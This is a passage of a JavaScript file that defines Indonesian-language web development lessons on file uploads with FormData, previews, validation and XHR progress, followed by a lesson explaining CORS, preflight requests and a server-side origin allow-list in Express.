        'Berbeda dari POST JSON yang tadi, di sini **tidak ada objek `headers` sama sekali**, dan itu bukan kelalaian. `FormData` yang dioper sebagai `body` membuat browser menyusun sendiri header `Content-Type` yang benar, lengkap dengan *boundary*-nya. Perhatikan juga `fd.append` dipanggil dua kali dengan jenis nilai yang berbeda, yaitu teks biasa dan objek `File`. Keduanya sah, dan itulah keunggulan format multipart, sebab satu permintaan bisa membawa data biasa dan berkas sekaligus, sehingga kamu tidak perlu mengunggah berkas dan menyimpan judulnya lewat dua permintaan terpisah. Argumen pertama `append` adalah **nama field** yang akan dibaca server, jadi ia harus cocok dengan yang diharapkan API-mu.',
      ),
      callout(
        'danger',
        'Jangan pernah menyetel `Content-Type` untuk `FormData`',
        'Multipart butuh *boundary* — penanda acak yang memisahkan tiap bagian. Browser menghasilkannya dan menyisipkannya ke header secara otomatis. Kalau kamu menulis `Content-Type: multipart/form-data` sendiri, boundary-nya hilang dan server **tidak bisa mem-parse body sama sekali**.',
      ),

      h2('Pratinjau sebelum diunggah'),
      code(
        'js',
        `
        const url = URL.createObjectURL(file);
        gambar.src = url;

        // WAJIB dilepas — kalau tidak, berkasnya tertahan di memori
        gambar.onload = () => URL.revokeObjectURL(url);
        `,
      ),
      p(
        '`URL.createObjectURL(file)` membuat alamat sementara berbentuk `blob:...` yang menunjuk ke berkas **di komputer pengguna sendiri**, sehingga tidak ada satu byte pun yang diunggah dan pratinjaunya muncul seketika bahkan untuk berkas besar serta tetap bekerja tanpa koneksi. Harganya disebut di komentar, yaitu alamat itu **menahan berkasnya di memori** sampai dilepas, dan browser tidak bisa menebak kapan kamu selesai memakainya. Karena itu `revokeObjectURL` wajib dipanggil, dan menaruhnya di `onload` adalah waktu yang tepat, sebab begitu gambarnya selesai digambar alamatnya tidak dibutuhkan lagi. Melewatkan baris itu tidak menimbulkan error apa pun, dan gejalanya hanya pemakaian memori yang terus naik pada halaman yang memilih banyak berkas berturut-turut.',
      ),

      h2('Validasi di klien — untuk kenyamanan'),
      code(
        'js',
        `
        const MAKS = 5 * 1024 * 1024;   // 5 MB
        const DIIZINKAN = ['image/jpeg', 'image/png', 'image/webp'];

        function periksa(file) {
          if (file.size > MAKS) return 'Ukuran maksimal 5 MB.';
          if (!DIIZINKAN.includes(file.type)) return 'Hanya JPG, PNG, atau WebP.';
          return null;
        }
        `,
      ),
      p(
        'Fungsi ini mengembalikan **pesan atau `null`** dan bukan `true`/`false`, pola kecil yang membuat pemanggilnya bisa langsung menampilkan hasilnya tanpa memetakan kode error ke kalimat. Perhatikan `DIIZINKAN` disusun sebagai **allow-list** dan bukan daftar yang dilarang, karena menyebutkan apa yang boleh selalu lebih aman daripada menebak semua yang tidak boleh, sebab daftar larangan selalu tertinggal. Penulisan `5 * 1024 * 1024` juga disengaja alih-alih menulis `5242880` langsung, karena perkaliannya sendiri yang menjelaskan bahwa angkanya berarti 5 MB. Meski begitu, seperti diperingatkan di bawah, seluruh isi fungsi ini hanya bernilai sebagai **kenyamanan**, sebab `file.size` dan `file.type` datang dari klien, dan endpoint-nya bisa dipanggil langsung tanpa halamanmu terlibat sama sekali.',
      ),
      callout(
        'danger',
        'Semua pemeriksaan di atas bisa dilewati',
        '`file.type` berasal dari ekstensi berkas di komputer pengguna — mengganti nama `virus.exe` menjadi `foto.jpg` sudah cukup mengubahnya. Dan siapa pun bisa memanggil endpointmu langsung dengan `curl`, tanpa membuka halamanmu sama sekali. **Server wajib memeriksa ulang: batas ukuran, ekstensi allow-list, dan isi berkas sungguhan lewat magic byte.** Dibahas tuntas di Backend Intermediate 2.7.',
      ),

      h2('Progres unggah'),
      code(
        'js',
        `
        // fetch belum punya progres unggah. Untuk berkas besar, XHR masih dipakai:
        function unggahDenganProgres(url, fd, onProgres) {
          return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();

            xhr.upload.addEventListener('progress', (e) => {
              if (e.lengthComputable) onProgres(Math.round((e.loaded / e.total) * 100));
            });

            xhr.addEventListener('load', () =>
              xhr.status < 400 ? resolve(xhr.responseText) : reject(new Error(\`\${xhr.status}\`)),
            );
            xhr.addEventListener('error', () => reject(new Error('Gagal terhubung')));

            xhr.open('POST', url);
            xhr.send(fd);
          });
        }
        `,
      ),
      p(
        "`unggahDenganProgres` membungkus API lama `XMLHttpRequest` ke dalam sebuah Promise — pola `new Promise` untuk membungkus API berbasis callback yang sudah dipelajari di Bab 3. `xhr.upload.addEventListener('progress', ...)` adalah satu-satunya alasan XHR masih dipakai di sini: `fetch` tidak punya event setara untuk melaporkan progres unggah berkas besar. Begitu unggahannya selesai, hasilnya diteruskan lewat `resolve`/`reject` seperti Promise pada umumnya, sehingga pemanggilnya tetap bisa memakai `await` seolah-olah ini `fetch` biasa.",
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Fitur unggah foto produk harus menerima sampai lima berkas sekaligus, menampilkan pratinjau sebelum dikirim, menunjukkan kemajuan unggahan, dan bisa dibatalkan di tengah jalan. Versi pertama memakai `fetch` biasa dan tiga masalah muncul, yaitu tidak ada kemajuan yang terlihat sehingga pengguna mengira aplikasinya menggantung, berkas 40 megabyte ditolak server setelah menunggu dua menit, dan tombol batal tidak melakukan apa-apa.',
      ),
      p(
        'Masalah pertama punya batas yang perlu diketahui sejak awal, yaitu `fetch` **tidak bisa** melaporkan kemajuan unggahan. Ia hanya bisa melaporkan kemajuan unduhan. Untuk kemajuan unggahan, `XMLHttpRequest` yang lebih tua masih satu-satunya jalan di sebagian besar peramban.',
      ),
      code(
        'js',
        `
        // Periksa DI KLIEN dulu, supaya pengguna tidak menunggu sia-sia.
        const JENIS_DIIZINKAN = new Set(['image/jpeg', 'image/png', 'image/webp']);
        const MAKS_BYTE = 5 * 1024 * 1024;

        function periksaBerkas(berkas) {
          if (!JENIS_DIIZINKAN.has(berkas.type)) {
            throw new ErrorValidasi(\`Jenis \${berkas.type || 'tidak dikenal'} tidak didukung\`, 'berkas');
          }
          if (berkas.size > MAKS_BYTE) {
            const mb = (berkas.size / 1024 / 1024).toFixed(1);
            throw new ErrorValidasi(\`Ukuran \${mb} MB melebihi batas 5 MB\`, 'berkas');
          }
        }

        // Pratinjau tanpa mengunggah apa pun.
        function buatPratinjau(berkas, img) {
          const alamat = URL.createObjectURL(berkas);
          img.src = alamat;
          // WAJIB dilepas, kalau tidak berkasnya tertahan di memori.
          img.addEventListener('load', () => URL.revokeObjectURL(alamat), { once: true });
        }
        `,
        { filename: 'src/unggah/periksa.js' },
      ),
      p(
        '`URL.createObjectURL` membuat alamat sementara yang menunjuk berkas di memori, sehingga pratinjau muncul seketika tanpa satu byte pun dikirim. Baris `revokeObjectURL` sesudahnya sering dilupakan, dan akibatnya nyata. Selama alamat itu belum dilepas, seluruh isi berkas tertahan di memori tab. Untuk lima foto berukuran empat megabyte, itu dua puluh megabyte yang tidak pernah dibersihkan sampai tab ditutup.',
      ),
      code(
        'js',
        `
        // XMLHttpRequest, dibungkus janji, karena hanya ia yang punya kemajuan unggah.
        export function unggahDenganKemajuan(alamat, formData, { sinyal, onKemajuan } = {}) {
          return new Promise((teruskan, tolak) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', alamat);
            xhr.responseType = 'json';

            xhr.upload.addEventListener('progress', (e) => {
              if (e.lengthComputable) onKemajuan?.(e.loaded / e.total);
            });

            xhr.addEventListener('load', () => {
              if (xhr.status >= 200 && xhr.status < 300) teruskan(xhr.response);
              else tolak(new ErrorServer(xhr.status));
            });
            xhr.addEventListener('error', () => tolak(new ErrorJaringan('Unggahan gagal')));
            xhr.addEventListener('abort', () =>
              tolak(new DOMException('Dibatalkan', 'AbortError')),
            );

            sinyal?.addEventListener('abort', () => xhr.abort(), { once: true });

            xhr.send(formData);   // JANGAN setel Content-Type sendiri
          });
        }
        `,
        { filename: 'src/unggah/kirim.js' },
      ),
      p(
        'Objek `xhr.upload` adalah kuncinya, dan ia berbeda dari `xhr` itu sendiri. Peristiwa `progress` pada `xhr` melaporkan kemajuan **unduhan** respons, sedangkan pada `xhr.upload` melaporkan kemajuan **unggahan**. Salah memilih di antara keduanya menghasilkan bilah kemajuan yang melompat dari nol ke seratus dalam sekejap di akhir, dan itu kesalahan yang sangat sering.',
      ),
      p(
        'Pemeriksaan `e.lengthComputable` diperlukan karena ukuran total tidak selalu diketahui, misalnya saat badan permintaan berupa aliran. Tanpa pemeriksaan itu, `e.total` bisa bernilai nol dan pembagiannya menghasilkan `NaN` yang membuat bilah kemajuannya hilang sama sekali.',
      ),
      p(
        "Baris `sinyal?.addEventListener('abort', ...)` menjembatani `AbortController` modern ke API lama, sehingga pemanggilnya tetap memakai pola yang sama dengan seluruh kode lain. Ini contoh membungkus di batas yang sudah dibahas di Bab 1, yaitu API lama dibungkus sekali sehingga sisa aplikasi tidak perlu tahu ia ada.",
      ),
      callout(
        'danger',
        'Pemeriksaan di klien hanya untuk kenyamanan, bukan keamanan',
        'Properti `berkas.type` berasal dari ekstensi nama berkas dan bisa dipalsukan dengan mudah. Berkas berisi skrip yang dinamai ulang menjadi berakhiran png akan lolos seluruh pemeriksaan di klien. Server wajib memeriksa isi berkasnya sungguhan lewat byte penanda di awal berkas, menyimpannya dengan nama acak di luar direktori yang bisa dieksekusi, dan membatasi ukurannya sendiri. Aturan lengkapnya ada di Kategori Keamanan Fullstack.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Unggah berkas punya kegagalan khasnya sendiri, dan sebagian besarnya baru muncul pada berkas besar atau jaringan lambat yang jarang tersentuh saat pengujian.',
      ),
      code(
        'text',
        `
        const fd = new FormData();
        fd.append('berkas', berkas);
        await fetch(alamat, {
          method: 'POST',
          headers: { 'Content-Type': 'multipart/form-data' },
          body: fd,
        });

        400 Bad Request — no multipart boundary was found
        `,
        { caption: '`Content-Type` yang ditulis manual menghilangkan pembatasnya.' },
      ),
      p(
        'Kiriman berkas memisahkan bagian-bagiannya dengan teks pembatas acak, dan pembatas itu harus disebut di dalam header `Content-Type`. Peramban membuatnya sendiri dan menyertakannya, sehingga menuliskan headernya secara manual justru menghapus informasi itu. Pesan dari server biasanya menyebut kata `boundary`, dan itu petunjuk yang langsung mengarah ke penyebabnya.',
      ),
      code(
        'text',
        `
        413 Payload Too Large

        # Setelah menunggu dua menit mengunggah berkas 40 MB.
        `,
        { caption: 'Server menolak setelah seluruh berkasnya terkirim.' },
      ),
      p(
        'Sebagian server memeriksa ukuran hanya setelah menerima seluruh badan permintaan, sehingga pengguna menunggu penuh lalu ditolak. Ini pemborosan waktu dan kuota yang sepenuhnya bisa dihindari dengan pemeriksaan di klien seperti pada studi kasus. Perlu diingat juga batas ini sering datang dari proksi di depan aplikasimu, bukan dari kodemu, sehingga menaikkan batas di aplikasi saja tidak cukup.',
      ),
      code(
        'text',
        `
        img.src = URL.createObjectURL(berkas);
        // revokeObjectURL tidak pernah dipanggil

        # Setelah pengguna memilih 30 foto berukuran 4 MB:
        # Tab memakai lebih dari 120 MB yang tidak pernah dibersihkan.
        `,
        { caption: 'Tidak ada error, dan memori terus naik.' },
      ),
      p(
        'Alamat objek menahan berkasnya di memori sampai dilepas secara eksplisit atau sampai dokumennya dibongkar. Tidak ada peringatan dan tidak ada gejala sampai tab menjadi berat atau mati di ponsel. Tab Memory di DevTools bisa menunjukkannya, dan pencegahannya satu baris, yaitu selalu memasangkan `createObjectURL` dengan `revokeObjectURL`.',
      ),
      code(
        'text',
        `
        xhr.addEventListener('progress', (e) => perbarui(e.loaded / e.total));

        # Bilah kemajuan diam di nol lalu melompat ke seratus di akhir.
        `,
        { caption: 'Peristiwa dipasang pada `xhr`, bukan pada `xhr.upload`.' },
      ),
      p(
        'Peristiwa `progress` pada objek `xhr` melaporkan kemajuan pengunduhan responsnya, dan respons unggahan biasanya hanya berupa JSON kecil yang selesai seketika. Karena itu bilahnya diam selama unggahan berjalan lalu melompat penuh saat responsnya tiba. Ganti menjadi `xhr.upload.addEventListener`, dan perilakunya langsung benar.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`no multipart boundary was found`',
            '`Content-Type` untuk `FormData` ditulis manual',
            'Hapus barisnya, biarkan peramban menyetelnya',
          ],
          [
            '`413 Payload Too Large` setelah menunggu lama',
            'Ukuran baru diperiksa di server',
            'Periksa `berkas.size` di klien sebelum mengirim',
          ],
          [
            'Memori tab terus naik setelah memilih banyak berkas',
            '`revokeObjectURL` tidak pernah dipanggil',
            'Lepas alamatnya setelah gambar selesai dimuat',
          ],
          [
            'Bilah kemajuan diam lalu melompat ke seratus',
            'Peristiwa dipasang pada `xhr`, bukan `xhr.upload`',
            "Pakai `xhr.upload.addEventListener('progress', ...)`",
          ],
          [
            'Kemajuan tidak muncul sama sekali',
            '`e.lengthComputable` bernilai salah, sehingga `e.total` nol',
            'Periksa `lengthComputable` sebelum membagi',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Unggah berkas adalah salah satu titik masuk paling sensitif ke sistemmu, dan sebagian besar kesalahan di bawah berujung pada keamanan atau pada pengalaman yang buruk di jaringan lambat.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengandalkan `accept` pada input sebagai penyaring jenis',
            'Dialog pemilih berkas memang menyaringnya',
            '`accept` hanya mengatur tampilan dialog, dan pengguna tetap bisa memilih Semua Berkas. Periksa `berkas.type` dan ukurannya di kode',
          ],
          [
            'Mempercayai `berkas.type` sebagai bukti jenis berkas',
            'Peramban yang menentukannya',
            'Nilainya ditebak dari ekstensi nama dan bisa dipalsukan. Server wajib memeriksa byte penanda di awal isi berkas',
          ],
          [
            'Membaca seluruh berkas dengan `FileReader` sebelum mengunggah',
            'Supaya bisa diperiksa isinya',
            'Berkas 50 megabyte akan berada di memori dua kali. Kirim objek `File` langsung lewat `FormData`, sebab ia dibaca sambil mengalir',
          ],
          [
            'Tidak menyediakan cara membatalkan unggahan',
            'Pengguna toh menunggu',
            'Unggahan di jaringan seluler bisa memakan menit. Tanpa tombol batal, satu-satunya jalan keluar adalah menutup tab',
          ],
          [
            'Mengirim lima berkas dalam lima permintaan bersamaan',
            'Lebih cepat daripada satu per satu',
            'Bandwidth unggah biasanya jauh lebih kecil daripada unduh, sehingga kelimanya justru saling memperlambat dan kemajuannya membingungkan. Kirim berurutan, atau dua sekaligus',
          ],
          [
            'Menyimpan nama berkas dari pengguna apa adanya di server',
            'Namanya kan sudah ada',
            'Nama bisa berisi karakter jalur yang menembus direktori, dan bisa menimpa berkas lain. Server harus memakai nama acak yang ia buat sendiri',
          ],
        ],
      ),
      p(
        'Baris ketiga layak diingat karena ia sering dilakukan tanpa alasan yang jelas. Objek `File` yang kamu dapat dari input sudah merupakan rujukan ke berkas di disk, dan `FormData` mengirimkannya sambil mengalir tanpa memuat seluruhnya ke memori. Membacanya dengan `FileReader` lebih dulu hanya diperlukan kalau kamu memang perlu isinya di klien, misalnya untuk pratinjau teks atau pengubahan ukuran gambar.',
      ),
      callout(
        'tip',
        'Untuk berkas sangat besar, potong menjadi bagian-bagian',
        'Unggahan tunggal berukuran ratusan megabyte akan gagal total kalau jaringan terputus di menit terakhir. Pola yang dipakai layanan besar adalah memotong berkas dengan `berkas.slice()` menjadi bagian beberapa megabyte, mengunggahnya satu per satu dengan nomor urut, lalu meminta server menggabungkannya. Bagian yang gagal cukup diulang sendiri, dan unggahan bisa dilanjutkan setelah terputus.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`FormData` + `fetch` sudah cukup untuk unggahan biasa.',
        'Jangan pernah menyetel `Content-Type` sendiri untuk `FormData`.',
        '`URL.createObjectURL` wajib dipasangkan dengan `revokeObjectURL`.',
        '`file.type` berasal dari klien dan bisa dipalsukan.',
        'Validasi klien adalah kenyamanan; server wajib memeriksa ulang semuanya.',
      ),
      references(
        {
          label: 'FormData',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/FormData',
          source: 'MDN',
          note: 'Termasuk aturan jangan menyetel `Content-Type` sendiri agar boundary tersusun benar.',
        },
        {
          label: 'File',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/File',
          source: 'MDN',
          note: 'Property `name`, `size`, dan `type` — beserta catatan bahwa `type` berasal dari klien.',
        },
        {
          label: 'URL.createObjectURL()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static',
          source: 'MDN',
          note: 'Pratinjau tanpa mengunggah, beserta kewajiban memanggil `revokeObjectURL`.',
        },
        {
          label: 'File Upload Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Daftar pemeriksaan yang wajib dilakukan server: magic bytes, ukuran, dan nama berkas.',
        },
        {
          label: 'HTML attribute: accept',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/accept',
          source: 'MDN',
          note: 'Menegaskan bahwa ia hanya menyaring dialog berkas, bukan mencegah apa pun.',
        },
      ),
    ],
  ),

  written(
    'cors',
    'CORS: apa yang sebenarnya terjadi',
    23,
    'Kenapa permintaanmu diblokir padahal `curl` ke alamat yang sama berhasil.',
    [
      p(
        'Hampir setiap orang yang belajar frontend pernah berhenti karena pesan ini. Kabar baiknya: setelah paham **siapa yang memblokir dan kenapa**, penyelesaiannya selalu sama dan selalu di sisi server.',
      ),

      terms(
        {
          term: 'origin',
          meaning:
            'Terjemahannya **asal**. Gabungan **protokol + host + port** sebuah alamat. Path tidak ikut dihitung. Karena ketiganya harus identik, `https://app.id` dan `https://api.app.id` adalah origin **berbeda** — subdomain pun dihitung host lain, dan ini yang paling sering mengejutkan.',
        },
        {
          term: 'same-origin policy',
          meaning:
            'Terjemahannya **kebijakan asal yang sama**. Aturan bawaan browser yang melarang halaman dari satu origin membaca jawaban dari origin lain. Alasannya sangat konkret: tanpa aturan ini, situs jahat yang kamu buka bisa memanggil `https://bank.id/api/saldo` **dengan cookie login-mu** lalu membaca hasilnya.',
        },
        {
          term: 'CORS',
          meaning:
            'Singkatan *Cross-Origin Resource Sharing*, terjemahannya **berbagi sumber daya lintas asal**. Perlu diluruskan: CORS **bukan** yang memblokir permintaanmu — same-origin policy yang memblokir, dan CORS justru mekanisme server untuk **mengizinkan pengecualian secara sadar**. Karena itu penyelesaiannya selalu di sisi server, tidak pernah di kodemu.',
        },
        {
          term: 'preflight',
          meaning:
            'Terjemahannya **penerbangan pendahuluan**. Permintaan `OPTIONS` yang **dikirim browser lebih dulu** untuk bertanya "boleh tidak saya mengirim permintaan seperti ini?". Terpicu oleh method selain GET/POST/HEAD, atau oleh header tidak baku seperti `Authorization`. Kalau preflight ditolak, permintaan sebenarnya tidak pernah dikirim sama sekali.',
        },
        {
          term: 'Access-Control-Allow-Origin',
          meaning:
            'Header **jawaban dari server** yang menyatakan origin mana yang boleh membaca hasilnya. Inilah header yang keberadaannya dicari browser. Perlu diingat: `*` tidak boleh dipakai bersama `credentials: "include"` — kombinasi itu ditolak spesifikasi karena akan membuka celah yang justru ingin ditutup.',
        },
        {
          term: 'simple request',
          meaning:
            'Terjemahannya **permintaan sederhana**. Permintaan yang **tidak memicu preflight** karena memenuhi syarat ketat: method GET, POST, atau HEAD, dengan `Content-Type` terbatas pada tiga nilai saja. Menambahkan satu header kustom saja sudah cukup membuatnya tidak lagi sederhana.',
        },
        {
          term: 'credentials',
          meaning:
            'Opsi `fetch` yang menentukan **apakah cookie ikut dikirim**. Nilai `include` mengirimnya bahkan lintas origin — dan begitu dipakai, server wajib menyebutkan origin secara persis serta menambahkan `Access-Control-Allow-Credentials: true`.',
        },
        {
          term: 'opaque response',
          meaning:
            'Terjemahannya **jawaban buram**. Jawaban yang **diterima browser tapi tidak boleh dibaca kodemu** — statusnya tampak `0` dan badannya kosong. Ini yang kamu lihat saat CORS gagal: datanya sebenarnya sampai, tapi browser menolak menyerahkannya kepadamu.',
        },
        {
          term: 'proxy',
          meaning:
            'Terjemahannya **perantara**. Server milikmu sendiri yang meneruskan permintaan ke API pihak ketiga. Ini jalan keluar yang sah saat kamu **tidak bisa mengubah** server tujuan — karena permintaan server-ke-server tidak tunduk pada same-origin policy sama sekali.',
        },
        {
          term: 'curl',
          meaning:
            'Alat baris perintah untuk mengirim permintaan HTTP. Disebut di sini karena ia **berhasil pada alamat yang persis sama** dengan yang diblokir di browser — dan itu bukan keanehan, melainkan bukti bahwa CORS adalah kontrol **browser**, bukan kontrol server. Konsekuensi pentingnya: CORS tidak pernah bisa dianggap sebagai pengaman.',
        },
      ),

      h2('Same-origin policy'),
      p('Dua alamat disebut **origin yang sama** kalau protokol, host, dan port-nya identik.'),
      table(
        ['Dibandingkan dengan `https://app.id/a`', 'Sama origin?'],
        [
          ['`https://app.id/b`', 'Ya — path tidak dihitung'],
          ['`http://app.id/a`', '**Tidak** — protokol beda'],
          ['`https://api.app.id/a`', '**Tidak** — subdomain dihitung host berbeda'],
          ['`https://app.id:8080/a`', '**Tidak** — port beda'],
        ],
      ),
      callout(
        'info',
        'Kenapa aturan ini ada',
        'Tanpanya, situs jahat yang kamu buka bisa memanggil `https://bank.id/api/saldo` **dengan cookie login-mu**, lalu membaca hasilnya. Same-origin policy adalah yang mencegah itu — dan CORS adalah cara server mengizinkan pengecualian secara sadar.',
      ),

      h2('Yang sebenarnya terjadi'),
      steps(
        {
          title: 'Browser tetap mengirim permintaannya',
          body: 'Ini bagian yang mengejutkan: server **menerima dan memprosesnya**. Kalau itu `POST` yang membuat data, datanya benar-benar terbuat.',
        },
        {
          title: 'Server membalas',
          body: 'Dengan atau tanpa header `Access-Control-Allow-Origin`.',
        },
        {
          title: 'Browser memeriksa header itu',
          body: 'Kalau tidak ada atau tidak cocok dengan origin halamanmu, browser **menolak memberikan responsnya ke JavaScript-mu**.',
        },
        {
          title: 'JavaScript melihat `TypeError`',
          body: 'Tanpa status, tanpa body — karena browser tidak pernah menyerahkannya kepadamu.',
        },
      ),
      callout(
        'warning',
        'Inilah kenapa `curl` berhasil dan browser tidak',
        'CORS ditegakkan **browser**, bukan server. `curl`, Postman, skrip Node, dan aplikasi mobile tidak terpengaruh sama sekali. Konsekuensi penting: **CORS bukan kontrol keamanan.** Ia tidak melindungi API-mu dari siapa pun — otorisasi tetap wajib ada di server.',
      ),

      h2('Preflight'),
      p(
        'Untuk permintaan yang bisa mengubah data, browser bertanya lebih dulu dengan `OPTIONS` — sebelum permintaan aslinya dikirim.',
      ),
      code(
        'text',
        `
        OPTIONS /api/tugas
        Origin: https://app.id
        Access-Control-Request-Method: POST
        Access-Control-Request-Headers: content-type, authorization

        --- balasan server ---
        Access-Control-Allow-Origin: https://app.id
        Access-Control-Allow-Methods: GET, POST, DELETE
        Access-Control-Allow-Headers: content-type, authorization
        Access-Control-Max-Age: 86400
        `,
      ),
      p(
        'Permintaan `OPTIONS` di atas adalah **preflight**, yaitu permintaan yang dikirim browser sendiri sebelum permintaan aslimu untuk bertanya "apakah aku boleh?". Kamu tidak menulisnya dan tidak bisa melihatnya di kodemu, karena ia hanya muncul di tab Network. Isinya berupa pengumuman niat. `Access-Control-Request-Method` menyebut method yang akan dipakai, dan `Access-Control-Request-Headers` menyebut header yang akan dikirim. Balasannya adalah izin yang harus **mencakup** semua yang diminta, sebab kalau `authorization` tidak disebut di `Allow-Headers`, permintaan aslinya tidak pernah dikirim sama sekali. `Access-Control-Max-Age: 86400` adalah izin untuk menyimpan jawaban ini selama sehari, sehingga preflight tidak diulang di setiap permintaan. Dan yang paling penting untuk dipahami, **seluruh percakapan ini terjadi di browser, bukan di server**, sehingga `curl` dan aplikasi mobile tidak terpengaruh sama sekali.',
      ),
      table(
        ['Tidak perlu preflight (simple request)', 'Perlu preflight'],
        [
          ['`GET`, `HEAD`, `POST`', '`PUT`, `PATCH`, `DELETE`'],
          ['`Content-Type` form/text/plain', '`Content-Type: application/json`'],
          ['Tanpa header kustom', 'Ada `Authorization` atau header kustom'],
        ],
      ),
      p(
        'Karena itu hampir semua panggilan API modern memicu preflight — mereka mengirim JSON dan membawa token.',
      ),

      h2('Memperbaikinya'),
      code(
        'js',
        `
        // Di server (contoh Express) — allow-list origin yang PERSIS
        const DIIZINKAN = ['https://app.id', 'https://staging.app.id'];

        app.use((req, res, next) => {
          const origin = req.headers.origin;
          if (DIIZINKAN.includes(origin)) {
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Vary', 'Origin');        // penting untuk cache
          }
          res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PATCH,DELETE');
          res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
          if (req.method === 'OPTIONS') return res.sendStatus(204);
          next();
        });
        `,
      ),
      p(
        "Perhatikan bahwa perbaikannya **selalu di server**, karena tidak ada satu pun opsi `fetch` yang bisa membuat browser mengabaikan CORS, dan itu memang tujuannya. Baris kuncinya adalah `if (DIIZINKAN.includes(origin))`, tempat server memeriksa asal permintaan terhadap daftar yang persis, lalu memantulkan kembali **origin itu sendiri** dan bukan tanda bintang. Itu perlu karena `Access-Control-Allow-Origin` hanya boleh memuat satu nilai, sehingga mendukung beberapa origin berarti memilih yang cocok per permintaan. `Vary: Origin` menyertainya dan sering dilupakan, sebab tanpa itu cache bisa menyimpan jawaban untuk satu origin lalu menyajikannya ke origin lain, dan izinnya jadi salah. Baris `if (req.method === 'OPTIONS')` menjawab preflight dengan `204` tanpa meneruskannya ke logika aplikasi, karena permintaan itu memang hanya bertanya dan tidak membawa data apa pun.",
      ),
      callout(
        'danger',
        'Dua kesalahan konfigurasi yang serius',
        '**`Access-Control-Allow-Origin: *` bersama `Allow-Credentials: true`** — browser menolaknya, dan alasannya penting: itu setara mengizinkan situs mana pun bertindak atas nama pengguna yang sedang login. **Memantulkan header `Origin` apa adanya** tanpa memeriksanya terhadap allow-list sama saja dengan tidak punya kebijakan.',
      ),

      h2('Saat pengembangan'),
      code(
        'js',
        `
        // Proxy di dev server membuat permintaan tampak same-origin,
        // sehingga CORS tidak ikut campur sama sekali.
        // vite.config.js
        export default {
          server: {
            proxy: { '/api': { target: 'http://localhost:4000', changeOrigin: true } },
          },
        };
        `,
      ),
      p(
        'Proxy ini tidak "mematikan CORS", melainkan **menghilangkan alasannya**. Dengan konfigurasi itu, kode frontend memanggil `/api/tugas` di alamat dev server-nya sendiri, jadi dari sudut pandang browser tidak ada perbedaan origin sama sekali dan CORS tidak ikut campur. Dev server yang meneruskan permintaan ke `localhost:4000` bukan browser, sehingga aturan itu tidak berlaku padanya. Ada dua hal yang perlu disadari. Pertama, ini **hanya berlaku saat pengembangan**, sebab di produksi frontend dan API biasanya benar-benar berbeda origin sehingga konfigurasi CORS di server tetap wajib disiapkan. Kedua, karena masalahnya tersembunyi selama pengembangan, kesalahan CORS sering baru ketahuan saat deploy pertama, dan itu alasan bagus untuk menguji tanpa proxy sekali sebelum rilis.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Aplikasi frontend berjalan di `app.tokomu.id` dan API-nya di `api.tokomu.id`. Di komputer pengembang semuanya bekerja karena keduanya berjalan di `localhost` dengan port berbeda dan proksi pengembangan menyamarkannya. Begitu dinaikkan ke produksi, seluruh permintaan gagal dengan pesan yang sama, yaitu `Failed to fetch`, dan tab Network menunjukkan status yang kosong. Tidak ada satu pun baris kode yang berubah.',
      ),
      p(
        'Berikut pesan aslinya, diambil dari Chromium sungguhan dengan dua server di port berbeda.',
      ),
      code(
        'text',
        `
        Access to fetch at 'http://127.0.0.1:4322/tanpa-cors' from origin
        'http://127.0.0.1:4321' has been blocked by CORS policy:
        No 'Access-Control-Allow-Origin' header is present on the requested resource.

        TypeError: Failed to fetch
        `,
        { caption: 'Dua pesan berpasangan, dan hanya yang kedua yang bisa ditangkap `catch`.' },
      ),
      p(
        'Perhatikan ada **dua** pesan yang muncul bersamaan, dan keduanya punya sifat yang berbeda. Pesan pertama ditulis peramban langsung ke console dan menjelaskan penyebabnya secara lengkap. Pesan kedua adalah yang sampai ke blok `catch`-mu, dan ia sengaja tidak menyebut apa pun tentang CORS. Alasannya keamanan, sebab kalau kodemu bisa membaca alasan kegagalannya, halaman jahat bisa memindai jaringan lokal pengguna.',
      ),
      p(
        'Akibat praktisnya, kegagalan CORS tidak bisa dibedakan dari tidak ada internet hanya dari dalam kode. Satu-satunya cara mengetahuinya adalah membaca console atau melihat tab Network. Inilah sebabnya keluhan berbunyi tombolnya tidak berfungsi begitu sulit ditelusuri lewat laporan galat otomatis, sebab yang tercatat hanya `Failed to fetch`.',
      ),
      code(
        'js',
        `
        // Sisi SERVER yang harus berubah. Klien tidak bisa memperbaiki CORS.
        // Contoh dengan Express:
        app.use((req, res, next) => {
          const asalDiizinkan = new Set([
            'https://app.tokomu.id',
            'https://staging.tokomu.id',
          ]);
          const asal = req.headers.origin;

          // Cocokkan PERSIS, jangan pantulkan apa pun yang datang.
          if (asalDiizinkan.has(asal)) {
            res.setHeader('Access-Control-Allow-Origin', asal);
            res.setHeader('Vary', 'Origin');            // penting untuk cache
            res.setHeader('Access-Control-Allow-Credentials', 'true');
          }

          if (req.method === 'OPTIONS') {
            res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
            res.setHeader('Access-Control-Max-Age', '86400');
            return res.sendStatus(204);
          }
          next();
        });
        `,
        { filename: 'server/cors.js' },
      ),
      p(
